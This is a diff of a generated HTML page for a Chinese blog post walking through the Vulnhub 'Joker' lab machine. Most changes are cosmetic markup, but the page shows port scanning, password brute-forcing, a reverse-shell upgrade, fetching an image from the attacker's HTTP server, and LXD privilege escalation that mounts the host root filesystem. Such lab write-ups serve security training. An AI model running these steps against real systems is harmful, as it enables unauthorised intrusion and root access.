@@ -23,7 +23,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.59.1 with theme even" />
+<meta name="generator" content="Hugo 0.72.0 with theme even" />
 
 
 <link rel="canonical" href="https://dds2333.github.io/post/2019/12/19/vulnhub_joker/" />
@@ -35,7 +35,7 @@
 
 
 
-<link href="/sass/main.min.8c3cbcb0324c2bb4875ceccba4007cbad4b4ac8377f33af9953c3e7684534a50.css" rel="stylesheet">
+<link href="/sass/main.min.4eb71590ad024de2ebb1b5eef94cbb645b7e63e6b9c4c837355530a75e112ce1.css" rel="stylesheet">
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
 
 
@@ -47,16 +47,13 @@
 <meta property="article:modified_time" content="2019-12-19T22:09:46+08:00" />
 <meta itemprop="name" content="Vulnhub 靶机渗透之 Joker">
 <meta itemprop="description" content="靶机 https://www.vulnhub.com/entry/ha-joker,379/ 前期准备 运行环境：VM Workstation，VM Esxi 目标 获取 root 权限并且读取/root/final.txt 主机信息 在 VM Workstation 中打开导入的虚拟">
-
-
 <meta itemprop="datePublished" content="2019-12-19T22:09:46&#43;08:00" />
 <meta itemprop="dateModified" content="2019-12-19T22:09:46&#43;08:00" />
 <meta itemprop="wordCount" content="659">
 
 
 
-<meta itemprop="keywords" content="Vulnhub,渗透测试," />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="Vulnhub,渗透测试," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Vulnhub 靶机渗透之 Joker"/>
 <meta name="twitter:description" content="靶机 https://www.vulnhub.com/entry/ha-joker,379/ 前期准备 运行环境：VM Workstation，VM Esxi 目标 获取 root 权限并且读取/root/final.txt 主机信息 在 VM Workstation 中打开导入的虚拟"/>
 
@@ -92,7 +89,7 @@
       </a><a href="/categories/">
         <li class="mobile-menu-item">分类</li>
       </a><a href="/about/">
-        <li class="mobile-menu-item">关于我</li>
+        <li class="mobile-menu-item">关于</li>
       </a>
   </ul>
 </nav>
@@ -113,7 +110,7 @@
       </li><li class="menu-item">
         <a class="menu-item-link" href="/categories/">分类</a>
       </li><li class="menu-item">
-        <a class="menu-item-link" href="/about/">关于我</a>
+        <a class="menu-item-link" href="/about/">关于</a>
       </li>
   </ul>
 </nav>
@@ -185,10 +182,10 @@
 <p>Nmap走一波</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span></pre></td>
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">nmap -sV -A -O -sS -p1-65535 192.168.32.141</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">nmap -sV -A -O -sS -p1-65535 192.168.32.141</code></pre></td></tr></table>
 </div>
 </div>
 <p><img src="/img/2019/12/19/nmap.png" alt="Nmap扫描" /></p>
@@ -198,19 +195,19 @@
 <h1 id="目录枚举">目录枚举</h1>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span></pre></td>
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">python3 dirsearch.py -u http://192.168.32.141/ -e php,html,js,json,.txt</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">python3 dirsearch.py -u http://192.168.32.141/ -e php,html,js,json,.txt</code></pre></td></tr></table>
 </div>
 </div>
 <p><img src="/img/2019/12/19/dirsearch.png" alt="目录枚举" /></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span></pre></td>
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">dirb http://192.168.32.141/ -X php,html,js,json,.txt</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">dirb http://192.168.32.141/ -X php,html,js,json,.txt</code></pre></td></tr></table>
 </div>
 </div>
 <p><img src="/img/2019/12/19/dirb.png" alt="目录枚举" /></p>
@@ -230,10 +227,10 @@
 <p>根据 secret.txt 中的提示信息，将/usr/share/wordlists/rockyou.txt.gz解压并截取前100作为口令，用户名取joker</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span></pre></td>
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">head -n 100 rockyou.txt &gt; dict.txt</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">head -n 100 rockyou.txt &gt; dict.txt</code></pre></td></tr></table>
 </div>
 </div>
 <p>使用 burpsuite 进行爆破</p>
@@ -273,12 +270,12 @@
 <p>得到反弹 shell，尝试使用 python pty 获取交互式 shell：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; 或 python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
-id</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; 或 python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+id</code></pre></td></tr></table>
 </div>
 </div>
 <p><img src="/img/2019/12/19/shell2.png" alt="shell" /></p>
@@ -288,14 +285,14 @@ id</pre></td></tr></table>
 <p>使用 LXD 提升权限，kali 执行以下操作：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">git clone https://github.com/saghul/lxd-alpine-builder.git
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">git clone https://github.com/saghul/lxd-alpine-builder.git
 cd lxd-alpine-builder
-./build-alpine</pre></td></tr></table>
+./build-alpine</code></pre></td></tr></table>
 </div>
 </div>
 <p><img src="/img/2019/12/19/lxd.png" alt="lxd提权" /></p>
@@ -305,12 +302,12 @@ cd lxd-alpine-builder
 <p>使用 Python 开启 http 服务</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">ls
-python -m SimpleHTTPServer</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">ls
+python -m SimpleHTTPServer</code></pre></td></tr></table>
 </div>
 </div>
 <p><img src="/img/2019/12/19/lxd2.png" alt="lxd提权" /></p>
@@ -318,14 +315,14 @@ python -m SimpleHTTPServer</pre></td></tr></table>
 <p>靶机 shell 执行以下操作：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">wget http://192.168.32.129:8000/alpine-v3.10-x86_64-20191218_2258.tar.gz
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">wget http://192.168.32.129:8000/alpine-v3.10-x86_64-20191218_2258.tar.gz
 lxc image import ./alpine-v3.10-x86_64-20191218_2258.tar.gz --alias myimage
-lxc image list</pre></td></tr></table>
+lxc image list</code></pre></td></tr></table>
 </div>
 </div>
 <p><img src="/img/2019/12/19/shell3.png" alt="lxd提权" /></p>
@@ -333,7 +330,7 @@ lxc image list</pre></td></tr></table>
 <p>最后，靶机 shell 执行以下命令获取 flag</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -341,16 +338,16 @@ lxc image list</pre></td></tr></table>
 </span><span class="lnt">6
 </span><span class="lnt">7
 </span><span class="lnt">8
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">lxc init myimage ignite -c security.privileged=true
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">lxc init myimage ignite -c security.privileged=true
 lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
 lxc start ignite
 lxc exec ignite /bin/sh
 id
 cd /mnt/root/root
 ls
-cat final.txt</pre></td></tr></table>
+cat final.txt</code></pre></td></tr></table>
 </div>
 </div>
 <p><img src="/img/2019/12/19/final.png" alt="lxd提权" /></p>
@@ -448,6 +445,15 @@ cat final.txt</pre></td></tr></table>
 
 
 <script type="text/javascript" src="/js/main.min.d7b7ada643c9c1a983026e177f141f7363b4640d619caf01d8831a6718cd44ea.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      TeX: {equationNumbers: {autoNumber: "AMS"}},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
 
 
 
